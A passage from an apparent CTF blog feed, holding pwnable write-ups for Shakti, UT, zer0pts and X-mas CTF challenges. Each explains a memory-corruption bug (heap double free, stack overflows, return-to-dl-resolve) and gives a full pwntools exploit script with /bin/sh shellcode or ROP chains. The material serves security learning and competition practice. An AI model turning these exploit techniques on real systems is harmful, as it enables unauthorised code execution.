class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;,4444)</span></span><br><span class="line">p = process([<span class="string">&#x27;./chall&#x27;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601050</span></span><br><span class="line">stdin = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data\n&#x27;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">50</span>,p64(stdin))</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;inside\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak = leak + <span class="number">0x76</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ec680</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3c2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">60</span>,p64(oneshot))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 UT CTF</title>
      <link>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/</guid>
      <pubDate>Fri, 12 Mar 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 UT CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;2SMOL-pwnable&quot;&gt;&lt;a href=&quot;#2SMOL-pwnable&quot; class=&quot;headerlink&quot; title=&quot;2SMOL (pwnable)&quot;&gt;&lt;/a&gt;2SMOL (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;First, Check the protection. All of protection is turned off. &lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 UT CTF Write-up </center><h1 id="2SMOL-pwnable"><a href="#2SMOL-pwnable" class="headerlink" title="2SMOL (pwnable)"></a>2SMOL (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png" alt="3"></p><p>First, Check the protection. All of protection is turned off. </p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png" alt="1"></p><p><img src="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png" alt="2"></p><p>It called only <code>read</code>functions. but the size of read is bigger than buffer. It is Buffer OverFlow.<br>And NXbit is turned off, So I can use shellcode to exploit.</p><p><img src="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png" alt="4"></p><p>But we only have 0x8 size to write. It is not enough to write shellcode on the stack, and also even if we can write shellcode on the stack, we can’t leak the stack address. </p><p><img src="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png" alt="6"></p><p>So we have to write on memory which we know address. It is <code>0x402000</code>. We can change the flow by using <code>leave ret</code> gadgets. then  we can write shellcode on memory. Lastly, overwrite return address to shellcode’s address.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.utctf.live&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smol&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./smol&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x402018</span></span><br><span class="line">fakerbp = <span class="number">0x402068</span></span><br><span class="line">syscall = <span class="number">0x40103d</span></span><br><span class="line">before_read = <span class="number">0x401015</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fakerbp)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x402028</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="resolve-pwnable"><a href="#resolve-pwnable" class="headerlink" title="resolve (pwnable)"></a>resolve (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png" alt="1"></p><p>First, Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p><p><img src="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png" alt="2"></p><p>The main function only call <code>get@plt</code>. It can occur overflow here. But there is no way to leak libc address and also doesn’t have system functions which can call <code>/bin/sh</code> in binary. But the method for exploit can be inferred from the name of the problem. The name is <code>resolve</code>. So i used <code>return-to-dl-resolve</code>. </p><p>If you don’t know well about this, Please refer to the reference.</p><blockquote><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></p></blockquote><p>Then let’s find gadgets for exploit.</p><p><img src="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png" alt="3"></p><p>There is <code>get</code>function. so i only need to control <code>rdi</code> for calling function. </p><p><img src="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png" alt="55"></p><p>And get section address what i need. like <code>plt</code>, <code>bss</code>, <code>dynsym</code>, <code>dynstr</code>, <code>rela.plt</code>…</p><p>Using <code>ROP</code>, make fake structure which is used by <code>lazy binding</code> and write on the memory which i know address. </p><p><img src="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png" alt="66"></p><p>In my case, I wrote on 0x404508. The red is fake structure of <strong>Elf64_Rela</strong>. And the orange is about <strong>Elf64_Sym</strong>. The last things are <code>system</code> and <code>/bin/sh</code>. </p><p>After making fake structure, The system function is executed by invoking the <code>plt</code>.</p><p><img src="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png" alt="8"></p><p>Finally, I can call <code>system(/bin/sh/)</code> </p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 zer0pts CTF</title>
      <link>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/</guid>
      <pubDate>Sat, 06 Mar 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 zer0pts CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;Not-Beginner’s-Stack-pwnable&quot;&gt;&lt;a href=&quot;#Not-Beginner’s-Stack-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Not Beginner’s Stack (pwnable)&quot;&gt;&lt;/a&gt;Not Beginner’s Stack (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;Let’s check the protection of the binary.&lt;br&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png&quot; alt=&quot;899&quot;&gt;&lt;br&gt;You can find that all protection is turned off.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 zer0pts CTF Write-up </center><h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020 X-mas CTF </title>
      <link>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/</link>
      <guid>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/</guid>
      <pubDate>Thu, 24 Dec 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2020 X-mas CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;Baby-Rudolph-pwnable&quot;&gt;&lt;a href=&quot;#Baby-Rudolph-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Baby_Rudolph (pwnable)&quot;&gt;&lt;/a&gt;Baby_Rudolph (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;There is Buffer Overflow in &lt;code&gt;vuln function&lt;/code&gt;. It is triggered by calling &lt;code&gt;read&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;And Using &lt;code&gt;get_arm&lt;/code&gt; function, we can get the sh. So it is easy bof. just overwrite retur address to &lt;code&gt;get_arm&lt;/code&gt;.&lt;/p&gt;</description>
      
      
      
